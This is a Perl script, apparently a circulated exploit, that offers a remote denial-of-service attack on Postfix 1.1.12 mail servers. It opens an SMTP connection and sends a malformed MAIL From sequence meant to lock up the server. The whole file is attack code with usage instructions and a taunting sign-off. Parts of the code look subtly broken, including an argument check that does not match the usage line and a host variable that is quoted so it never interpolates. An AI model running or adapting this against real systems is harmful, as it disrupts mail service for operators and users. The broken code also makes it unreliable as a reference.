#!/usr/bin/perl

#Remote Dos for postfix version 1.1.12
#tested on redhat 9.0, redhat 8.0, mandrake 9.0
#deadbeat,
#mail: daniels@legend.co.uk
#	 deadbeat@sdf.lonestar.org
#
#thanks..enjoy ;)

use IO::Socket;
if (!$ARGV[3]){
   die "Usage:perl $0 <subject> <data> <smtp host to use>\n";
}
$subject = $ARGV[0];
$junk = $ARGV[1];
$smtp_host = $ARGV[2];


$helo = "HELO $smtp_host\r\n";
$rcpt = "RCPT To:<nonexistant@127.0.0.1>\r\n";
$data = "DATA\n$junk\r\n";
$sub = "Subject: $subject\r\n";
$from = "MAIL From <.!@$smtp_host>\r\n";
print "Going to connect to $smtp_host\n";
$sox = IO::Socket::INET->new(
   Proto=> 'tcp',
   PeerPort=>'25',
   PeerAddr=>'$smtp_host',
);
print "Connected...\n";
print $sox $helo;
sleep 1;
print $sox $from;
sleep 1;
print $sox $rcpt;
sleep 1;
print $sox $sub;
sleep 1;
print $sox $data;
sleep 1;
print $sox ".\r\n\r\n";
sleep 1;
close $sox;
print "Done..should lock up Postfix 1.1.12 and below ;)\n\n";

